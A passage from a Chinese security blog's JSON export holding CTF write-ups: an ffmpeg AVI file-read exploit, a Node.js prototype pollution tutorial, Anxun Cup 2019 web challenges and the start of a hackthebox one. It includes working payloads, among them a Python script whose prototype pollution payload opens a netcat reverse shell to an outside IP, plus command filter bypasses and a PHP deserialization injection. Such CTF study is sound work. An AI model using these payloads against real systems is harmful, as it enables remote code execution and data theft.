的是视频上传功能，而随便上传后再下下来我们的上传视频，会发现视频的MD5值发生改变。说明可能服务器对视频处理过了。这里赵师傅设计的是ffmpeg对视频处理。所以可找能处理ffmpeg漏洞的脚本https://github.com/neex/ffmpeg-avi-m3u-xbin/ 1python gen_xbin_avi.py file:&#x2F;&#x2F;&#x2F;flag test.avi 上传后再下下来，第一帧就有flag了。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"从杭电hgame-week4学原型链污染","slug":"从杭电hgame-week4学原型链污染","date":"2020-02-18T08:20:22.000Z","updated":"2021-02-18T05:08:26.894Z","comments":true,"path":"2020/02/18/从杭电hgame-week4学原型链污染/","link":"","permalink":"https://www.bycsec.top/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","excerpt":"因为数模导致本来不打算做week4的题目的，不过当时瞅了一眼sekiro这道题并且看出来是原型链污染(也有叫Node.js污染,javasrcipt原型链污染的)。可惜当时没做过，没深入也没做出来。今天抽空看了下wp才明白。干脆把当时查阅资料学到的知识总结下。 时间线上看，国内最早出现的原型链污染题目应该是出自P牛代码审计知识星球的hard-the js。整体上算比较新的洞。在各种比赛出现频次一般，原因有很多，这点之后再谈。其主要是前端形式的攻击，而且涉及到javascript知识更多些，因此还是要从javascript的角度学习下：","text":"因为数模导致本来不打算做week4的题目的，不过当时瞅了一眼sekiro这道题并且看出来是原型链污染(也有叫Node.js污染,javasrcipt原型链污染的)。可惜当时没做过，没深入也没做出来。今天抽空看了下wp才明白。干脆把当时查阅资料学到的知识总结下。 时间线上看，国内最早出现的原型链污染题目应该是出自P牛代码审计知识星球的hard-the js。整体上算比较新的洞。在各种比赛出现频次一般，原因有很多，这点之后再谈。其主要是前端形式的攻击，而且涉及到javascript知识更多些，因此还是要从javascript的角度学习下： 原型链经常有这样一种说法：javascript中万物皆对象。这个说法严格来讲不准确，但是却体现了js语法及使用上的特性。javaScript中的对象其实就是一些键值对的集合，每一个键值对叫做一个属性，比如：此时对象obj就有了name与website两个属性。但其实其输出内容并不只有这两个，完整输出的如下：可以看到，输出属性中出现了proto以及constructor这样的字眼，那他们到底是什么呢？这要提到js继承的概念，继承的整个过程就称为该类的原型链。从刚刚的例子可以看到，从obj的__proto__中能明白其父类是Object.(Constructor返回用于创建这个对象的函数)，同时还有许多其他函数。 对于类，有一个与之相对应的属性，叫做prototype。且二者等价。比如下面这个p牛的经典例子 从类的角度讲，prototype是其一个属性，所有类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。但是类所实例化的对象并不能通过prototype访问原型，所以才有__proto__出现，且一个对象的proto属性，指向这个对象所在的类的prototype属性。 原型链污染而原型链的特性决定了其在js继承中的重要之处。而其特性表现在，在我们调用一个对象的某一属性时： 1231.对象(obj)中寻找这一属性2.如果找不到，则在obj.__proto__中寻找属性3.如果仍然找不到，则继续在obj.__proto__.__proto__中寻找这一属性 以上机制被称为js的prototype继承链。而原型链污染就与这有关 比如以下代码： 123456let foo = &#123;bar: 1&#125;console.log(foo.bar)foo.__proto__.bar = 2console.log(foo.bar)let zoo = &#123;&#125;console.log(zoo.bar) 结果为可以发现，在我们通过__proto__修改bar值后，再度实例化一个新的对象时，其bar值从1变为了2。原因如下：前面修改foo的原型foo.__proto__.bar = 2，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2.那么后面我们zoo相当于是实例化了一个Object类，自然有属性bar=2. 所以原型链污染定义如下： 如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染 使用场景原型链污染的使用场景我也不熟，但是目前根据题目出现的情况，主要与这两个函数有关 12merge()clone() 常用源码如下,可以看出clone与merge并无本质区别： 12345678910111213const merge = (a, b) =&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a&#125;const clone = (a) =&gt; &#123; return merge(&#123;&#125;, a);&#125; 本质上这两个函数会有风险，就是因为存在能够控制数组（对象）的“键名”的操作。但是要想实现原型链污染，光只要键名可控是不够的。以下面这个例子为参考： 123456789function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125; 尝试把第二个键名设为__proto__并赋值b为2。看看能不能把object的属性b改为2。可以看见最后o3.b返回的是undefined,并没有污染成功。主要原因就是因为__proto__没有被认为是一个键名。而这就需要我上面提到的另一个条件,代码如下时： 1234567let o1 = &#123;&#125;let o2 = JSON.parse('&#123;\"a\": 1, \"__proto__\": &#123;\"b\": 2&#125;&#125;')merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b) 如果存在JSON.parse()，就能成功把__proto__解析成键名了。 有了这些基础，就基本能了解原型链污染的原理了。 真题hgame sekiro回头来看hgame中sekiro这道题，题目给出的关键源码主要在一下两个js文件中route/index.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758var express = require('express');var router = express.Router();var game = require('../utils/index');const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;const merge = (a, b) =&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a&#125;const clone = (a) =&gt; &#123; return merge(&#123;&#125;, a);&#125;var Game = new game();router.get('/', function (req, res) &#123; res.render('index');&#125;);router.post('/action', function (req, res) &#123; if (!req.session.sekiro) &#123; res.end(\"Session required.\") &#125; if (!req.session.sekiro.alive) &#123; res.end(\"You dead.\") &#125; var body = JSON.parse(JSON.stringify(req.body)); var copybody = clone(body) if (copybody.solution) &#123; req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution) &#125; res.end(\"提交成功\")&#125;)router.get('/attack', function (req, res) &#123; if (!req.session.sekiro) &#123; res.end(\"Session required.\") &#125; if (!req.session.sekiro.alive) &#123; res.end(\"You dead.\") &#125; req.session.sekiro.attackInfo = Game.getAttackInfo() res.end(req.session.sekiro.attackInfo.method)&#125;)router.get('/info', function (req, res) &#123; if (typeof(req.query.restart) != \"undefined\" || !req.session.sekiro) &#123; req.session.sekiro = &#123; \"health\": 3000, posture: 0, alive: true &#125; &#125; res.json(req.session.sekiro);&#125;)module.exports = router; 以及util/index.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950function game() &#123; this.attacks = [ &#123; \"method\": \"连续砍击\", \"attack\": 1000, \"additionalEffect\": \"sekiro.posture+=100\", \"solution\": \"连续格挡\" &#125;, &#123; \"method\": \"普通攻击\", \"attack\": 500, \"additionalEffect\": \"sekiro.posture+=50\", \"solution\": \"格挡\" &#125;, &#123; \"method\": \"下段攻击\", \"attack\": 1000, \"solution\": \"跳跃踩头\" &#125;, &#123; \"method\": \"突刺攻击\", \"attack\": 1000, \"solution\": \"识破\" &#125;, &#123; \"method\": \"巴之雷\", \"attack\": 1000, \"solution\": \"雷反\" &#125;, ] this.getAttackInfo = function () &#123; return this.attacks[Math.floor(Math.random() * this.attacks.length)] &#125; this.dealWithAttacks = function (sekiro, solution) &#123; if (sekiro.attackInfo.solution !== solution) &#123; sekiro.health -= sekiro.attackInfo.attack if (sekiro.attackInfo.additionalEffect) &#123; var fn = Function(\"sekiro\", sekiro.attackInfo.additionalEffect + \"\\nreturn sekiro\") sekiro = fn(sekiro) &#125; &#125; sekiro.posture = (sekiro.posture &lt;= 500) ? sekiro.posture : 500 sekiro.health = (sekiro.health &gt; 0) ? sekiro.health : 0 if (sekiro.posture == 500 || sekiro.health == 0) &#123; sekiro.alive = false &#125; return sekiro &#125;&#125;module.exports = game; 很容易发现index.js中，在/action这个路由里，有merge(),clone()函数的出现。于是我们跟进下，发现要到dealWithAttacks()这个函数去，于是再审计下关键代码： 1234if (sekiro.attackInfo.additionalEffect) &#123; var fn = Function(\"sekiro\", sekiro.attackInfo.additionalEffect + \"\\nreturn sekiro\") sekiro = fn(sekiro)&#125; 这里的attackInfo.additionalEffect如果能被我们污染，明显是可以直接RCE的。那么我们要做的就是污染Object类，当题目执行attackInfo.additionalEffect找不到additionalEffect时，就会继续找到基类被污染的这一属性，从而执行我们的代码。 所以paylaod如下 1&#123;\"solution\":\"1\",\"__proto__\": &#123;\"additionalEffect\":\"global.process.mainModule.constructor._load('child_process'). exec('nc vps-ip 8877 -e /bin/sh',function()&#123;&#125;);\"&#125;&#125; 我在使用bp传值时没弹到shell,后来只能用python写脚本了，也许是JSON数据的问题吧。 1234567891011121314import requestsimport jsonurl='http://sekiro.hgame.babelfish.ink/action'cookie=&#123; 'session':'s%3ACDDqh7q_XQ-rRAIB7W93PfE75p9oD7gS.UQuPEE0eikMrkIoAUaWJ3TFIibdRs72odZliCVcyzrk'&#125;headers=&#123; 'Content-Type':'application/json'&#125;payload=&#123;\"solution\":\"1\",\"__proto__\": &#123;\"additionalEffect\":\"global.process.mainModule.constructor._load('child_process'). exec('nc 120.27.246.202 8888 -e /bin/sh',function()&#123;&#125;);\"&#125;&#125;res=requests.post(url,cookies=cookie,headers=headers,data=json.dumps(payload))print(res.text) 使用bash弹shell貌似没成，可能是某些奇怪的问题 code-breaking thejs开头提到了p牛知识星球的这道题，那么现在再来看看： 123456789101112131415161718192021222324252627282930313233343536373839404142const fs = require('fs')const express = require('express')const bodyParser = require('body-parser')const lodash = require('lodash')const session = require('express-session')const randomize = require('randomatic')const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use('/static', express.static('static'))app.use(session(&#123; name: 'thejs.session', secret: randomize('aA0', 16), resave: false, saveUninitialized: false&#125;))app.engine('ejs', function (filePath, options, callback) &#123; // define the template engine fs.readFile(filePath, (err, content) =&gt; &#123; if (err) return callback(new Error(err)) let compiled = lodash.template(content) let rendered = compiled(&#123;...options&#125;) return callback(null, rendered) &#125;)&#125;)app.set('views', './views')app.set('view engine', 'ejs')app.all('/', (req, res) =&gt; &#123; let data = req.session.data || &#123;language: [], category: []&#125; if (req.method == 'POST') &#123; data = lodash.merge(data, req.body) req.session.data = data &#125; res.render('index', &#123; language: data.language, category: data.category &#125;)&#125;)app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`)) 漏洞点非常清晰，就是一个POST处用到了merge,显然存在原型链污染漏洞。那么关键函数需要去看看，所以需要参考lodash的代码（lodash是一个辅助功能集，这里主要用到的还是lodash.merge和lodash.template）如果去审计源码，会发现这样一个属性https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165及对应源码，和后面的调用。 123456var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + '\\n' : '';// ...var result = attempt(function() &#123; return Function(importsKeys, sourceURL + 'return ' + source) .apply(undefined, importsValues);&#125;); 开始sourceURL是空值，但是后面它作为new Function的第二个参数中，造成任意代码执行漏洞。所以payload如下： 1&#123;\"__proto__\":&#123;\"sourceURL\":\"\\u000aglobal.process.mainModule.constructor._load('child_process').exec('nc 120.27.246.202 8888 -e /bin/sh',function()&#123;&#125;);\"&#125;&#125; 需要注意的是，此处的/u000a必不可少,这时json中的换行。并且一定要把Content-Type必须设置成application/json。否则__proto__会被处理成字符串。这里同样使用跟hgame那道题一样的弹shell手段。可以拿到shell同时因为不知道文件名，使用cat /fl*来模糊处理。值得一提的是，p牛对此题的payload额外带了一个for循环 1for (var a in&#123;&#125;) &#123;delete Object.prototype[a]&#125; 删掉污染的原型。这时因为原型污染这一漏洞除非整个程序重启，否则所有的对象都会被污染与影响。这样在awd等等比赛中一旦你拿到flag,就有可能被别人直接访问到。 总结下：1.原型链污染属于前端漏洞应用，基本上需要源码审计功力来进行解决；找到merge(),clone()只是确定漏洞的开始2.进行审计需要以达成RCE为主要目的。通常exec, return等等都是值得注意的关键字。3.题目基本是以弹shell为最终目的。目前来看很多Node.js传统弹shell方式并不适用.wget,curl,以及我两道题都用到的nc比较适用。 参考文章： https://www.anquanke.com/post/id/176884#h3-5https://xz.aliyun.com/t/2802https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"javascript","slug":"javascript","permalink":"https://www.bycsec.top/tags/javascript/"}]},{"title":"安洵杯2019-web复现","slug":"安洵杯2019-web复现","date":"2020-02-10T03:02:32.000Z","updated":"2021-02-18T05:08:21.568Z","comments":true,"path":"2020/02/10/安洵杯2019-web复现/","link":"","permalink":"https://www.bycsec.top/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/","excerpt":"发现buuoj上安洵2019的题目有现成的，不用在vps上搭了(第一题除外，搭好才发现……)，刚好做做。","text":"发现buuoj上安洵2019的题目有现成的，不用在vps上搭了(第一题除外，搭好才发现……)，刚好做做。 easy_web进去后url有两个明显参数，第一个类似于base64编码，第二个由参数名知道可能是rce参数 1?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D; 先解码前面一个参数的值，发现base64解了两次后得到一串数字，看起来像十六进制字符。尝试16进制解码后得到555.pnf0证实了加密方式。加上图片的回显有base64的内容，可知img参数用于文件包含，那么包含下index.php吧 1234567891011import base64import binasciistr='index.php'filename = str.encode(encoding='utf-8')hex = binascii.b2a_hex(filename)print(hex)base1 = base64.b64encode(hex)base2 = base64.b64encode(base1)print(base2.decode('utf-8')) 得到源码 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header('content-type:text/html;charset=utf-8');$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);if (preg_match(\"/flag/i\", $file)) &#123; echo '&lt;img src =\"./ctf3.jpeg\"&gt;'; die(\"xixi～ no flag\");&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo \"&lt;img src='data:image/gif;base64,\" . $txt . \"'&gt;&lt;/img&gt;\"; echo \"&lt;br&gt;\";&#125;echo $cmd;echo \"&lt;br&gt;\";if (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i\", $cmd)) &#123; echo(\"forbid ~\"); echo \"&lt;br&gt;\";&#125; else &#123; if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) &#123; echo `$cmd`; &#125; else &#123; echo (\"md5 is funny ~\"); &#125;&#125;?&gt;&lt;html&gt;&lt;style&gt; body&#123; background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC;&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 第一个参数已经利用完了，而第二个参数用于rce,但明显过滤了许多读取文件的命令。同时可知要执行命令必须绕过一层MD5对比。基于使用了php强相等符号，可知一定要找到一对MD5相同的不同字符串。可以用某种MD5碰撞生成器得到。我直接用官方wp里的吧 12a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 之后就是执行命令了。直接利用匹配正则里面\\的疏忽，用它使我们的关键字构建出来 1ca\\t%20&#x2F;flag cat &#x2F;flag 或者使用没被过滤的读取文件的命令 1sort &#x2F;flag easy_serialize_php题目对我有点难，但是打开了反序列化新世界的大门一道反序列化利用题，上来直接给了源码 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET['f'];function filter($img)&#123; $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[\"user\"] = 'guest';$_SESSION['function'] = $function;extract($_POST);if(!$function)&#123; echo '&lt;a href=\"index.php?f=highlight_file\"&gt;source_code&lt;/a&gt;';&#125;if(!$_GET['img_path'])&#123; $_SESSION['img'] = base64_encode('guest_img.png');&#125;else&#123; $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));&#125;$serialize_info = filter(serialize($_SESSION));if($function == 'highlight_file')&#123; highlight_file('index.php');&#125;else if($function == 'phpinfo')&#123; eval('phpinfo();'); //maybe you can find something in here!&#125;else if($function == 'show_image')&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img']));&#125; 思路上首先看看可控的参数，有get传值的f,img_path。但是注意到img_path搭配上f为show_image时，返回的内容并不可用，因为 1$_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;])); 中，我们传的值经过sha1加密后并没有解密，故不可用。此时关注其他重点,有一句 1extract($_POST); 是一个变量覆盖的利用。所以我们的变量值都可以通过post操作改变，这样可控的参数多了起来。同时注意到序列化语句，会在调用show_image时被触发 1$serialize_info &#x3D; filter(serialize($_SESSION)); 漏洞点正在于此，在序列化数据之后，它经过了一层过滤才给变量赋值。而从最上方的过滤函数可知，出现被过滤的关键字直接替换为空。那么这是否会有漏洞可以用呢？答案是肯定的。出题人如是说： 任何具有一定结构的数据，如果经过了某些处理而把结构体本身的结构给打乱了，则有可能会产生漏洞。 其意义在于，给user所赋的值刚好24个，而这24个字符由于过滤flag的原因，在经过序列化后被置为空。这时就可以吞掉一个function，做到任意读取文件。 首先从提示phpinfo处找到一个不可直接读的php文件，我们先尝试利用漏洞读取它看看。（由于关键字里过滤了f1ag，所以在phpinfo界面搜f1ag关键字，果断发现d0g3_f1ag.php）下面我来构造下序列化的类，从源码知道SESSION类有三个属性： 123456789&lt;?phpclass SESSION&#123; var $user=\"flagflagflagflagflagflag\"; var $function='a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"test\";s:1:\"a\";&#125;';# 其中为d0g3_f1ag.php base64编码 var $img=\"MS5qcGc=\";# 值为1.jpg的base64编码&#125;$a=new SESSION();echo(serialize($a)); 生成的payload如下： 1O:7:\"SESSION\":3:&#123;s:4:\"user\";s:24:\"flagflagflagflagflagflag\";s:8:\"function\";s:61:\"a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"test\";s:1:\"a\";&#125;\";s:3:\"img\";s:8:\"MS5qcGc=\";&#125; 而经过过滤后 1O:7:\"SESSION\":3:&#123;s:4:\"user\";s:24:\"\";s:8:\"function\";s:61:\"a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"test\";s:1:\"a\";&#125;\";s:3:\"img\";s:8:\"MS5qcGc=\";&#125; 此时user属性对应的值被置空，那么它就要去把后面的24个字符置为它的值。也就是 1\";s:8:\"function\";s:59:\"a\" 相当于吞掉了function属性，但是我们构造的$function中，包含了img属性的值，以及构造的一个test属性的值，使得我们的序列化数据仍然是满足一个类对应三个键值。这时它对序列化数据的匹配就是由{开始，到}结束。所以后面多余的字符&quot;;s:3:&quot;img&quot;;s:8:&quot;MS5qcGc=&quot;;}全部被忽略。这样，我们通过控制function属性的值，达到了控制img属性值的效果，从而触发反序列化，读取文件。最终payload如下： 1_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&amp;function&#x3D;show_image (function也可以直接get传)另外题目构造的其实是SESSION数组进行序列化，但是序列化格式一样，都可行。 12345&lt;?php$b=array(\"user\"=&gt;\"flagflagflagflagflagflag\", \"function\"=&gt;'a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"test\";s:1:\"a\";&#125;', \"img\"=&gt;\"MS5qcGc=\");echo(serialize($b)); 不是文件上传也是一道反序列化题目，意图在于反序列化结合sql注入。在源码审计上下了不少功夫。如果我在比赛中做多半会卡在sql注入上吧。 首先进入页面，可以发现网站底部留下了wowouploadimage，可以拿到一份源码。主要内容如下：upload.php 12345678910111213141516171819&lt;?phpinclude(\"./helper.php\");class upload extends helper &#123; public function upload_base()&#123; $this-&gt;upload(); &#125;&#125;if ($_FILES)&#123; if ($_FILES[\"file\"][\"error\"])&#123; die(\"Upload file failed.\"); &#125;else&#123; $file = new upload(); $file-&gt;upload_base(); &#125;&#125;$a = new helper();?&gt; show.php 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpinclude(\"./helper.php\");$show = new show();if($_GET[\"delete_all\"])&#123; if($_GET[\"delete_all\"] == \"true\")&#123; $show-&gt;Delete_All_Images(); &#125;&#125;$show-&gt;Get_All_Images();class show&#123; public $con; public function __construct()&#123; $this-&gt;con = mysqli_connect(\"127.0.0.1\",\"root\",\"root\",\"pic_base\"); if (mysqli_connect_errno($this-&gt;con))&#123; die(\"Connect MySQL Fail:\".mysqli_connect_error()); &#125; &#125; public function Get_All_Images()&#123; $sql = \"SELECT * FROM images\"; $result = mysqli_query($this-&gt;con, $sql); if ($result-&gt;num_rows &gt; 0)&#123; while($row = $result-&gt;fetch_assoc())&#123; if($row[\"attr\"])&#123; $attr_temp = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $row[\"attr\"]); $attr = unserialize($attr_temp); &#125; echo \"&lt;p&gt;id=\".$row[\"id\"].\" filename=\".$row[\"filename\"].\" path=\".$row[\"path\"].\"&lt;/p&gt;\"; &#125; &#125;else&#123; echo \"&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;\"; &#125; mysqli_close($this-&gt;con); &#125; public function Delete_All_Images()&#123; $sql = \"DELETE FROM images\"; $result = mysqli_query($this-&gt;con, $sql); &#125;&#125;?&gt; helper.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293&lt;?phpclass helper &#123; protected $folder = \"pic/\"; protected $ifview = False; protected $config = \"config.txt\"; // The function is not yet perfect, it is not open yet. public function upload($input=\"file\") &#123; $fileinfo = $this-&gt;getfile($input); $array = array(); $array[\"title\"] = $fileinfo['title']; $array[\"filename\"] = $fileinfo['filename']; $array[\"ext\"] = $fileinfo['ext']; $array[\"path\"] = $fileinfo['path']; $img_ext = getimagesize($_FILES[$input][\"tmp_name\"]); $my_ext = array(\"width\"=&gt;$img_ext[0],\"height\"=&gt;$img_ext[1]); $array[\"attr\"] = serialize($my_ext); $id = $this-&gt;save($array); if ($id == 0)&#123; die(\"Something wrong!\"); &#125; echo \"&lt;br&gt;\"; echo \"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;\"; &#125; public function getfile($input) &#123; if(isset($input))&#123; $rs = $this-&gt;check($_FILES[$input]); &#125; return $rs; &#125; public function check($info) &#123; $basename = substr(md5(time().uniqid()),9,16); $filename = $info[\"name\"]; $ext = substr(strrchr($filename, '.'), 1); $cate_exts = array(\"jpg\",\"gif\",\"png\",\"jpeg\"); if(!in_array($ext,$cate_exts))&#123; die(\"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;\"); &#125; $title = str_replace(\".\".$ext,'',$filename); return array('title'=&gt;$title,'filename'=&gt;$basename.\".\".$ext,'ext'=&gt;$ext,'path'=&gt;$this-&gt;folder.$basename.\".\".$ext); &#125; public function save($data) &#123; if(!$data || !is_array($data))&#123; die(\"Something wrong!\"); &#125; $id = $this-&gt;insert_array($data); return $id; &#125; public function insert_array($data) &#123; $con = mysqli_connect(\"127.0.0.1\",\"root\",\"root\",\"pic_base\"); if (mysqli_connect_errno($con)) &#123; die(\"Connect MySQL Fail:\".mysqli_connect_error()); &#125; $sql_fields = array(); $sql_val = array(); foreach($data as $key=&gt;$value)&#123; $key_temp = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $key); $value_temp = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $value); $sql_fields[] = \"`\".$key_temp.\"`\"; $sql_val[] = \"'\".$value_temp.\"'\"; &#125; $sql = \"INSERT INTO images (\".(implode(\",\",$sql_fields)).\") VALUES(\".(implode(\",\",$sql_val)).\")\"; mysqli_query($con, $sql); $id = mysqli_insert_id($con); mysqli_close($con); return $id; &#125; public function view_files($path)&#123; if ($this-&gt;ifview == False)&#123; return False; //The function is not yet perfect, it is not open yet. &#125; $content = file_get_contents($path); echo $content; &#125; function __destruct()&#123; # Read some config html $this-&gt;view_files($this-&gt;config); &#125;&#125;?&gt; 先从比较直观的地方开始审计。我个人首先从helper.php开始观察。因为这很有可能存在是一个反序列化利用的代码。果然首先注意到，helper类中，有着经典的_destruct()魔术方法，它调用的view_file()方法，会执行file_get_contents()函数。显然是利用它。回过头再仔细看下触发方式。首先，在helper.php中，发现图片的attr属性被序列化存储。 1$array[&quot;attr&quot;] &#x3D; serialize($my_ext); 之后在show.php中，调用了一次反序列化 1234if($row[\"attr\"])&#123;$attr_temp = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $row[\"attr\"]);$attr = unserialize($attr_temp);&#125; 然后注意我们的upload图片操作，传图片后，调用了check()函数，但是并没有对文件名做检测就被保存为info，之后作为参数传进了save()函数。save()本质上执行了一次sql语句： 1$sql = \"INSERT INTO images (\".(implode(\",\",$sql_fields)).\") VALUES(\".(implode(\",\",$sql_val)).\")\"; 也就是说，我们其实是通过控制上传图片的文件名，触发sql注入，进一步触发反序列化，达到目的。所以现生成反序列化payoad: 12345678&lt;?phpclass helper&#123; protected $ifview = True; protected $config = \"/flag\";&#125;$a=new helper();echo(serialize($a)); 得到结果需要调整为 1O:6:\"helper\":2:&#123;s:9:\"\\0\\0\\0ifview\";b:1;s:9:\"\\0\\0\\0config\";s:5:\"/flag\";&#125; 这是由于protected的属性决定的。如果是private则是两个%00%00。然后构造文件名，我们只需让文件的序列化部分改为我们的payload。基于普通上传执行语句为： 1INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES('1','1.jpg','jpg','pic/f20c76cc4fb41838.jpg','a:2:&#123;s:5:\"width\";i:1264;s:6:\"height\";i:992;&#125;') 我们把文件名改改 1INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES('1','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),('1.jpg') 其中的由于引号问题，我们的payload需要字符串转16进制。上传文件即可触发得到flag.","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"hackthebox-ezpz","slug":"hackthebox-ezpz","date":"2020-02-06T10:14:41.000Z","updated":"2021-02-18T05:09:14.384Z","comments":true,"path":"2020/02/06/hackthebox-ezpz/","link":"","permalink":"https://www.bycsec.top/2020/02/06/hackthebox-ezpz/","excerpt":"hackthebox上的web challenge ezpz是去年十二月末才新出的一道ctf题目。这道题相当的有意思，而且对我还是比较有难度的，但是做出来的那一瞬间又发现其实并非那么令人困扰，反而学到了许多。所以在此记录一下做题过程。感谢zjy师傅以及外国网友Z1LV3R的提示","text":"hackthebox上的web challenge ezpz是去年十二月末才新出的一道ctf题目。这道题相当的有意思，而且对我还是比较有难度的，但是做出来的那一瞬间又发现其实并非那么令人困扰，反而学到了许多。所以在此记录一下做题过程。感谢zjy师傅以及外国网友Z1LV3R的提示 首先进入页面，发现有两个报错： 其中，第一个报错其实就是 1PHP: Notice: Undefined variable 意思是有未定义变量，那么自然就是obj了。所以下一步我们传参变量那么如何解决第二个错误呢？从中可以看出，ID之于obj可能是property与object的关系。也就是说，obj可能是包含ID的某种序列化数据的变量。实际上，如下代码 123&lt;?php$obj=array(\"ID\"=&gt;1234);echo($obj-&gt;IDS);#此处访问一个未定义的IDS触发报错 与 123&lt;?php$obj=json_decode(\"&#123;'ID':'1234'&#125;\");echo $obj-&gt;IDs; 的返回都是：所以我们才能看到回显。因此尝试构造数据吧。加上题目页面源码中提示了Hint : base64_encode($data)&gt;（或者我们把obj置为数组，也可以触发报错，提示我们数据需要base64encode）经过尝试，可以发现是要对json数据编码。那我们传一个ID值为1的数据 1?obj&#x3D;eyJJRCI6ICIxIn0&#x3D; 